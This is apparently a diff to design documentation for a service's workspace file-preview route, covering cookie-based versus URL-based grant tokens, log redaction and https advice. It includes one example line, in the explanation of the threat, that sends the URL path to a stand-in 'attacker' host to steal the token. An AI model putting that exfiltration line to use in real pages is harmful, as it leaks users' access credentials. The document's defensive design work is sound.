@@ -481,15 +481,37 @@ response. CORS is skipped entirely only when `LmStreaming:EnableCors` is set to 
 
 `GET /api/conversations/{threadId}/workspace/{grant}/{**path}` serves a workspace file so a rendered
 HTML page's own relative links (`img/x.png`, `../shared/style.css`) resolve to sibling workspace
-files. The `{grant}` segment **is the credential on that route**. It exists because the fetches that
-use it — an `<iframe src>`, an `<img src>`, a stylesheet `<link>` inside the served document — cannot
-carry an `Authorization` header, so under `Identity:Enforce` the identity middleware would refuse
-every one of them before routing and the preview pane would go blank with no error the client can
-see.
+files. A **grant is the credential on that route**. It exists because the fetches that use it — an
+`<iframe src>`, an `<img src>`, a stylesheet `<link>` inside the served document — cannot carry an
+`Authorization` header, so under `Identity:Enforce` the identity middleware would refuse every one of
+them before routing and the preview pane would go blank with no error the client can see.
 
-The grant is minted by `POST /api/conversations/{threadId}/files/grant`, which is an ordinary
-bearer-authenticated request and is authorized through the same `ConversationAuthorizer`
-(`AccessAction.Read`) as every other file route. It is an ASP.NET Core Data Protection token —
+**The grant travels one of two ways, and the CLIENT picks which.** The served document is sandboxed
+but keeps `allow-scripts`, and a sandboxed document may always navigate itself — no CSP directive
+stops that — so a credential in its own URL is one `location.href = 'https://attacker/?g=' +
+location.pathname` away from leaving. So:
+
+- **Cookie transport (the default).** The mint answers `Set-Cookie: lm_ws_grant=<token>; HttpOnly;
+  Secure; SameSite=None; Partitioned`, with **no `Domain`** (host-only) and `Path` scoped to
+  `/api/conversations/{threadId}/workspace/`, so the browser never sends it anywhere else. The
+  `{grant}` segment then carries only the constant public marker `cookie`, which is all a script
+  inside the document can read — and which, presented without the cookie, is refused exactly as a
+  forged token is. `SameSite=None` is required because the sandbox gives the document an opaque
+  origin, so the browser classes its subresource requests as cross-site; `Partitioned` (CHIPS) keeps
+  the cookie eligible where third-party cookies are blocked.
+- **URL transport (the fallback).** The `{grant}` segment is the token itself. This is what a
+  deployment served over plain `http` from something other than `localhost` gets, because a browser
+  will not store a `Secure` cookie there. The client chooses from `window.isSecureContext`, which is
+  true exactly where a `Secure` cookie is accepted; this host cannot make the choice itself because
+  it may sit behind an https front that does not forward its scheme.
+
+A client that sends no body at all still gets the URL transport, so nothing written before this
+existed breaks.
+
+The grant is minted by `POST /api/conversations/{threadId}/files/grant` (body
+`{"transport":"cookie"|"url"}`, optional), which is an ordinary bearer-authenticated request and is
+authorized through the same `ConversationAuthorizer` (`AccessAction.Read`) as every other file
+route. It is an ASP.NET Core Data Protection token —
 encrypted and authenticated with this host's key ring — and it **binds**: the conversation it was
 minted for, and the full principal of the caller who minted it (tenant, actor, on-behalf-of, app id,
 scopes, roles). It lives for **one hour**; the client re-mints five minutes before that. Presenting
@@ -503,13 +525,21 @@ Operator notes:
   containerised or scaled-out deployment. Keys default to the local profile, so each replica has its
   own ring and every restart invalidates outstanding grants. The symptom is a burst of `401`s on
   preview subresources, not an outage: the client re-mints on the next open.
-- The grant is a bearer value in a URL path. This host redacts it out of its own request log
-  (`Program.RedactWorkspaceGrant` rewrites the segment to `[grant]`), and never logs it anywhere
-  else. A reverse proxy, CDN or load balancer in front of this host writes its own access log that
-  this process cannot redact — redact `/api/conversations/*/workspace/*` there too if those logs
-  leave your trust boundary. Browser history and the address bar of an "open in new tab" are
-  accepted residual, bounded by the one-hour lifetime and by the grant reading one conversation's
-  workspace and nothing else.
+- **Under the URL transport only**, the grant is a bearer value in a URL path. This host redacts it
+  out of its own request log (`Program.RedactWorkspaceGrant` rewrites the segment to `[grant]`), and
+  never logs it anywhere else. A reverse proxy, CDN or load balancer in front of this host writes its
+  own access log that this process cannot redact — redact `/api/conversations/*/workspace/*` there
+  too if those logs leave your trust boundary. Browser history and the address bar of an "open in new
+  tab" are accepted residual, bounded by the one-hour lifetime and by the grant reading one
+  conversation's workspace and nothing else. Under the cookie transport none of this applies: the
+  path segment is a public constant.
+- **Serve this app over https** (or from `localhost`). That is not only a transport concern here: it
+  is what lets the client use the cookie transport at all, and the URL transport it otherwise falls
+  back to is the one that exposes a live read credential to the previewed page.
+- `Partitioned` (CHIPS) is honoured by Chromium. A browser that does not know the attribute ignores
+  it and keeps the `SameSite=None` cookie, which is the pre-CHIPS behaviour and still correct; a
+  browser that blocks third-party cookies **without** supporting CHIPS would drop it, and the preview
+  pane goes blank until the page is reloaded. There is no server-side signal for this.
 
 ### Recommended flip order
 
